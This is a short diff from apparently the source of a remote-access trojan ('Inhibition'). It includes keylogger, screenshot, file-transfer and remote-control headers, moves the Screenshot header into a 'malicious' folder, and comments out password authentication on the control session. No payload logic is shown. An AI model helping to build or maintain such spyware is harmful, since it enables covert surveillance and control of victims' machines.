@@ -7,7 +7,7 @@
 #include <blaspheme/Blaspheme.hpp>
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <malicious/Keylogger.hpp>
-#include "Screenshot.hpp"
+#include <malicious/Screenshot.hpp>
 #include "CommandDispatcher.hpp"
 #include "ProgramStart.hpp"
 #include "RemoteControlFunctions.hpp"
@@ -118,7 +118,7 @@ namespace Inhibition
     void InhibitionCoreImpl::set_connection_infos(const Blaspheme::ConnectionInfo& info)
     {
         cinfo = info;
-		session.setAuthenfication(new StringBasedAuth(cinfo.password));
+		//session.setAuthentication(new StringBasedAuth(cinfo.password));
     }
 
     const string& InhibitionCoreImpl::getInstallPath()
